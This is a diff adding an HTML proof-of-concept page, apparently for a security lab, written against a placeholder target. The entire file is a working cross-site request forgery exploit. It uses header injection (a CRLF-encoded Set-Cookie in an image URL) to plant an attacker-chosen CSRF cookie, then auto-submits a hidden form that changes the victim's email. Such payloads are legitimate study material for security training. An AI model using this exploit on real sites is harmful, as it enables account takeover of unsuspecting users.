@@ -1,0 +1,10 @@
+<html>
+  <body>
+    <form action="https://TARGET_ORIGIN/CHANGE_PATH" method="POST">
+      <input type="hidden" name="email" value="test@example.com">
+      <input type="hidden" name="csrf" value="YOUR-KEY">
+    </form>
+    <img src="https://TARGET_ORIGIN/SEED_PATH?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+  </body>
+</html>
+
